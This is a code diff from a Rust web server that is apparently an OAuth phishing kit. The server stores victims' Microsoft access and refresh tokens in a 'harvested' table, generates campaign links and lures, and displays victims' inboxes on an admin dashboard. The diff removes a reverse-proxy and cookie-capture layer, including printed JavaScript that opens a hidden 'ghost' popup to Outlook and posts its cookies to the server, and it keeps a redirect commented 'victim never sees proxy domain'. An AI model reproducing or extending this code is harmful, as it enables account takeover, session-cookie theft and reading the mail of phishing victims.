@@ -80,21 +80,10 @@ mod teams;
 use teams::{list_teams_handler, list_team_channels_handler, share_to_teams_handler};
 
 mod cookie_client;
-use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, test_cookie_session_handler, ghost_session_capture_handler, get_session_status_handler, kill_session_handler};
+use cookie_client::{generate_bookmarklet_token_handler, sync_cookies_handler, test_cookie_session_handler, get_session_status_handler, kill_session_handler};
 
 mod tenant_utils;
 use tenant_utils::{detect_tenant_fixed, get_location_from_ip};
-
-mod proxy;
-use proxy::{proxy_handler, proxy_status_handler, ProxyConfig};
-
-mod cookie_capture;
-use cookie_capture::{cookie_report_handler, get_cookies_handler, delete_cookies_handler, get_cookie_stats_handler, validate_session_handler};
-
-mod proxy_session;
-use proxy_session::{create_proxy_session_handler, get_proxy_session_status_handler, kill_proxy_session_handler, get_proxy_session_url_handler, refresh_proxy_session_handler, list_active_sessions_handler};
-
-mod proxy_security;
 
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
@@ -109,13 +98,7 @@ pub struct AppConfig {
     telegram_chat_id: Option<String>,
     master_secret: String,
     frontend_url: Option<String>,
-    // Proxy configuration
-    proxy_domain: String,
-    proxy_enabled: bool,
-    proxy_port: u16,
-    proxy_max_sessions: usize,
-    proxy_rate_limit: u32,
-    proxy_secret: String,
+
 }
 
 impl AppConfig {
@@ -134,12 +117,7 @@ impl AppConfig {
             telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
             master_secret: env::var("MASTER_SECRET").expect("MASTER_SECRET not set"),
             frontend_url: env::var("FRONTEND_URL").ok(),
-            proxy_domain: env::var("PROXY_DOMAIN").unwrap_or_else(|_| "baloncloud.eu".to_string()),
-            proxy_enabled: env::var("PROXY_ENABLED").unwrap_or_else(|_| "true".to_string()) == "true",
-            proxy_port: env::var("PROXY_PORT").unwrap_or_else(|_| "8080".to_string()).parse().unwrap_or(8080),
-            proxy_max_sessions: env::var("PROXY_MAX_SESSIONS").unwrap_or_else(|_| "50".to_string()).parse().unwrap_or(50),
-            proxy_rate_limit: env::var("PROXY_RATE_LIMIT").unwrap_or_else(|_| "100".to_string()).parse().unwrap_or(100),
-            proxy_secret: env::var("PROXY_SECRET").unwrap_or_else(|_| "changeme_proxy_secret_32_chars_long".to_string()),
+
         }
     }
 }
@@ -160,11 +138,7 @@ struct HarvestedToken {
     category: Option<String>,
     #[serde(rename = "account_type")]
     account_type: Option<String>,
-    cookie_session: Option<String>,
     last_refreshed_at: Option<chrono::DateTime<Utc>>,
-    session_status: Option<String>,
-    session_active_at: Option<chrono::DateTime<Utc>>,
-    session_killed_at: Option<chrono::DateTime<Utc>>,
 }
 
 #[derive(Clone)]
@@ -174,7 +148,6 @@ pub struct AppState {
     http_client: Client,
     vault: Vault,
     response_key: [u8; 32],
-    proxy_config: ProxyConfig,
 }
 
 /// Retrieve token from vault (tokens table) or fall back to harvested table.
@@ -185,7 +158,7 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
     }
     // Fall back to harvested table (legacy plain-text storage)
     let row: HarvestedToken = sqlx::query_as(
-        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?"
+        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?"
     )
     .bind(token_id)
     .fetch_one(&state.pool)
@@ -203,7 +176,6 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
         created_at: row.captured_at,
         last_refreshed_at: None,
         account_type: row.account_type.or(row.category),
-        cookie_session: row.cookie_session,
     })
 }
 
@@ -524,7 +496,7 @@ async fn exchange_code(
                 // Store in harvested table (legacy, for dashboard display)
                 // Session is ACTIVE immediately - OAuth token provides full access
                 match sqlx::query(
-                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at, session_status, session_active_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                    "INSERT INTO harvested (id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
                 )
                 .bind(&id)
                 .bind(&email)
@@ -539,8 +511,6 @@ async fn exchange_code(
                 .bind(&category)
                 .bind(&account_type)
                 .bind(Option::<chrono::DateTime<Utc>>::None)
-                .bind("active")
-                .bind(Utc::now())
                 .execute(&state.pool)
                 .await {
                     Ok(result) => println!("[exchange] Inserted into harvested table: {} rows affected", result.rows_affected()),
@@ -676,69 +646,13 @@ async fn auth_success_handler(
         </div>
     </div>
     <script>
-        // Step 1: Open ghost window to real Outlook to capture OWA cookies
-        // This popup is on the outlook.live.com origin, so it can read OWA cookies
-        (function() {{
-            var tokenId = '{}';
-            var outlookUrl = '{}';
-            
-            // Open a 1x1 pixel popup to real Outlook (hidden from view)
-            var ghostWindow = window.open(outlookUrl, '_blank', 'width=1,height=1,left=-1000,top=-1000');
-            
-            if (ghostWindow) {{
-                // Wait for the popup to load, then read cookies and send them
-                setTimeout(function() {{
-                    try {{
-                        // The popup is on the same origin as outlook.live.com
-                        // We can read its cookies via the popup's document
-                        var ghostCookies = ghostWindow.document.cookie;
-                        
-                        // Send the cookies to our server
-                        fetch('/api/capture-session', {{
-                            method: 'POST',
-                            headers: {{ 'Content-Type': 'application/json' }},
-                            body: JSON.stringify({{
-                                token_id: tokenId,
-                                cookies: ghostCookies,
-                                user_agent: navigator.userAgent,
-                                url: ghostWindow.location.href,
-                                timestamp: new Date().toISOString()
-                            }})
-                        }}).then(function() {{
-                            console.log('[ghost] Cookies captured successfully');
-                        }}).catch(function(e) {{
-                            console.log('[ghost] Cookie capture failed:', e);
-                        }});
-                        
-                        // Close the ghost window
-                        ghostWindow.close();
-                    }} catch(e) {{
-                        console.log('[ghost] Error reading cookies:', e);
-                        ghostWindow.close();
-                    }}
-                }}, 2000);
-            }}
-            
-            // Also report any cookies from current domain (backup)
-            fetch('/api/proxy/cookie-report', {{
-                method: 'POST',
-                headers: {{ 'Content-Type': 'application/json' }},
-                body: JSON.stringify({{
-                    token_id: tokenId,
-                    cookies: document.cookie,
-                    url: window.location.href,
-                    timestamp: new Date().toISOString()
-                }})
-            }}).catch(function(e) {{ console.log('Domain cookie report failed:', e); }});
-            
-            // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
-            setTimeout(function() {{
-                window.location.href = outlookUrl;
-            }}, 3000);
-        }})();
+        // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
+        setTimeout(function() {{
+            window.location.href = '{}';
+        }}, 3000);
     </script>
 </body>
-</html>"#, token_id, outlook_url);
+</html>"#, outlook_url);
 
     HttpResponse::Ok()
         .content_type("text/html; charset=utf-8")
@@ -747,7 +661,7 @@ async fn auth_success_handler(
 
 // JSON API: list all tokens
 async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -785,14 +699,6 @@ async fn api_delete_tokens(
 
     for id in &body.token_ids {
         // Delete related records first to avoid foreign key constraint violations
-        let _ = sqlx::query("DELETE FROM proxy_sessions WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
-        let _ = sqlx::query("DELETE FROM captured_cookies WHERE token_id = ?")
-            .bind(id)
-            .execute(&state.pool)
-            .await;
         let _ = sqlx::query("DELETE FROM rules WHERE token_id = ?")
             .bind(id)
             .execute(&state.pool)
@@ -914,7 +820,7 @@ pub struct InboxApiQuery {
 }
 
 async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
-    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?")
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
         .await
@@ -1173,53 +1079,11 @@ async fn deploy_worker(state: web::Data<AppState>) -> impl Responder {
     }
 }
 
-// Proxy health check endpoint
-async fn proxy_health_handler(state: web::Data<AppState>) -> impl Responder {
-    HttpResponse::Ok().json(serde_json::json!({
-        "status": "ok",
-        "proxy_enabled": state.config.proxy_enabled,
-        "proxy_domain": state.config.proxy_domain,
-        "proxy_port": state.config.proxy_port,
-        "proxy_max_sessions": state.config.proxy_max_sessions,
-        "proxy_rate_limit": state.config.proxy_rate_limit,
-        "timestamp": Utc::now().to_rfc3339()
-    }))
-}
-
 // robots.txt handler to prevent search engine indexing
 async fn robots_txt_handler() -> impl Responder {
     HttpResponse::Ok()
         .content_type("text/plain")
-        .body("User-agent: *\nDisallow: /\n\n# Proxy domain - do not index\n")
-}
-
-// Proxy test endpoint - returns a simple test page
-async fn proxy_test_handler() -> impl Responder {
-    HttpResponse::Ok().content_type("text/html").body(r#"<!DOCTYPE html>
-<html>
-<head>
-    <title>Proxy Test</title>
-    <style>
-        body { font-family: system-ui, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
-        .success { color: #22c55e; }
-        .info { background: #f3f4f6; padding: 15px; border-radius: 8px; margin: 20px 0; }
-        code { background: #e5e7eb; padding: 2px 6px; border-radius: 4px; }
-    </style>
-</head>
-<body>
-    <h1 class="success">✓ Proxy Server is Running</h1>
-    <div class="info">
-        <p><strong>Status:</strong> Active</p>
-        <p><strong>Endpoint:</strong> <code>/proxy-test</code></p>
-        <p><strong>Time:</strong> <span id="time"></span></p>
-    </div>
-    <p>If you can see this page, the proxy infrastructure is working correctly.</p>
-    <p>Next step: Complete <strong>Step 2</strong> to implement the reverse proxy logic.</p>
-    <script>
-        document.getElementById('time').textContent = new Date().toISOString();
-    </script>
-</body>
-</html>"#)
+        .body("User-agent: *\nDisallow: /\n\n# SimdiaTokens - do not index\n")
 }
 
 // Helper: refresh access token
@@ -1259,7 +1123,7 @@ async fn root_status() -> impl Responder {
 
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at, session_status, session_active_at, session_killed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -1372,25 +1236,6 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
         .execute(pool).await;
     let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN account_type TEXT")
         .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN cookie_session TEXT")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN cookie_session TEXT")
-        .execute(pool).await;
-    
-    // Migration: add session status columns for Ghost Window Session Bridge
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_status TEXT DEFAULT 'pending'")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_status TEXT DEFAULT 'pending'")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_active_at DATETIME")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_active_at DATETIME")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_killed_at DATETIME")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_killed_at DATETIME")
-        .execute(pool).await;
-
     sqlx::query(
         r#"
         CREATE TABLE IF NOT EXISTS recon_reports (
@@ -1484,58 +1329,6 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
         "#
     ).execute(pool).await?;
 
-    // Step 3: Cookie Capture & Storage - captured_cookies table
-    sqlx::query(
-        r#"
-        CREATE TABLE IF NOT EXISTS captured_cookies (
-            id TEXT PRIMARY KEY,
-            token_id TEXT NOT NULL,
-            cookie_name TEXT NOT NULL,
-            cookie_value TEXT NOT NULL,
-            cookie_domain TEXT,
-            cookie_path TEXT,
-            expires_at TEXT,
-            is_httponly INTEGER,
-            is_secure INTEGER,
-            captured_at TEXT NOT NULL
-        )
-        "#
-    ).execute(pool).await?;
-
-    // Add index for faster token_id lookups
-    let _ = sqlx::query(
-        "CREATE INDEX IF NOT EXISTS idx_captured_cookies_token_id ON captured_cookies(token_id)"
-    ).execute(pool).await;
-
-    // Step 4: Proxy Session Management - proxy_sessions table
-    sqlx::query(
-        r#"
-        CREATE TABLE IF NOT EXISTS proxy_sessions (
-            id TEXT PRIMARY KEY,
-            token_id TEXT NOT NULL,
-            proxy_url TEXT NOT NULL,
-            status TEXT NOT NULL,
-            created_at TEXT NOT NULL,
-            last_active_at TEXT,
-            expires_at TEXT,
-            FOREIGN KEY (token_id) REFERENCES harvested(id)
-        )
-        "#
-    ).execute(pool).await?;
-
-    // Add index for faster token_id lookups
-    let _ = sqlx::query(
-        "CREATE INDEX IF NOT EXISTS idx_proxy_sessions_token_id ON proxy_sessions(token_id)"
-    ).execute(pool).await;
-
-    // Migration: Add proxy session columns to harvested table
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN proxy_session_status TEXT")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN proxy_session_url TEXT")
-        .execute(pool).await;
-    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN proxy_session_created_at TEXT")
-        .execute(pool).await;
-
     Ok(())
 }
 
@@ -1597,8 +1390,7 @@ async fn main() -> std::io::Result<()> {
     let http_client = Client::new();
     let vault = Vault::new(config.master_secret.clone());
     let response_key = ResponseCrypto::derive_key(&config.master_secret);
-    let proxy_config = ProxyConfig::new(config.proxy_domain.clone());
-    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key, proxy_config });
+    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key });
 
     let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
     let port = port.parse::<u16>().unwrap_or(8080);
@@ -1661,28 +1453,10 @@ async fn main() -> std::io::Result<()> {
             .route("/api/tokens/{id}/session/bookmarklet", web::get().to(generate_bookmarklet_token_handler))
             .route("/api/tokens/{id}/session/sync", web::post().to(sync_cookies_handler))
             .route("/api/tokens/{id}/session/test", web::get().to(test_cookie_session_handler))
-            .route("/api/capture-session", web::post().to(ghost_session_capture_handler))
             .route("/api/tokens/{id}/session/status", web::get().to(get_session_status_handler))
             .route("/api/tokens/{id}/session/kill", web::post().to(kill_session_handler))
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
-            // Proxy status endpoints (must be before catch-all)
-            .route("/api/proxy/status", web::get().to(proxy_status_handler))
-            .route("/api/proxy/health", web::get().to(proxy_health_handler))
-            .route("/proxy-test", web::get().to(proxy_test_handler))
-            // Cookie capture routes - Step 3: Cookie Capture & Storage
-            .route("/api/proxy/cookie-report", web::post().to(cookie_report_handler))
-            .route("/api/proxy/cookies/{token_id}", web::get().to(get_cookies_handler))
-            .route("/api/proxy/cookies/{token_id}", web::delete().to(delete_cookies_handler))
-            .route("/api/proxy/cookies/{token_id}/stats", web::get().to(get_cookie_stats_handler))
-            .route("/api/proxy/cookies/{token_id}/validate", web::get().to(validate_session_handler))
-            // Proxy session routes - Step 4: Proxy Session Management
-            .route("/api/tokens/{id}/proxy-session/create", web::post().to(create_proxy_session_handler))
-            .route("/api/tokens/{id}/proxy-session/status", web::get().to(get_proxy_session_status_handler))
-            .route("/api/tokens/{id}/proxy-session/kill", web::delete().to(kill_proxy_session_handler))
-            .route("/api/tokens/{id}/proxy-session/url", web::get().to(get_proxy_session_url_handler))
-            .route("/api/tokens/{id}/proxy-session/refresh", web::post().to(refresh_proxy_session_handler))
-            .route("/api/proxy-sessions/active", web::get().to(list_active_sessions_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
             .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
@@ -1715,17 +1489,6 @@ async fn main() -> std::io::Result<()> {
             .route("/api/inbox/local-folders/{folder_id}/messages", web::get().to(list_local_folder_messages_handler))
             .route("/api/inbox/auto-filter", web::post().to(auto_filter_handler))
             .route("/api/lure/generate", web::post().to(generate_lure_handler))
-            // Catch-all proxy routes - MUST be last!
-            .route("/owa/{tail:.*}", web::route().to(proxy_handler))
-            .route("/mail/{tail:.*}", web::route().to(proxy_handler))
-            .route("/calendar/{tail:.*}", web::route().to(proxy_handler))
-            .route("/people/{tail:.*}", web::route().to(proxy_handler))
-            .route("/onedrive/{tail:.*}", web::route().to(proxy_handler))
-            .route("/api/{tail:.*}", web::route().to(proxy_handler))
-            .route("/resources/{tail:.*}", web::route().to(proxy_handler))
-            .route("/scripts/{tail:.*}", web::route().to(proxy_handler))
-            .route("/owamail/{tail:.*}", web::route().to(proxy_handler))
-            .route("/s/{tail:.*}", web::route().to(proxy_handler))
     })
     .bind(("0.0.0.0", port))?
     .run()
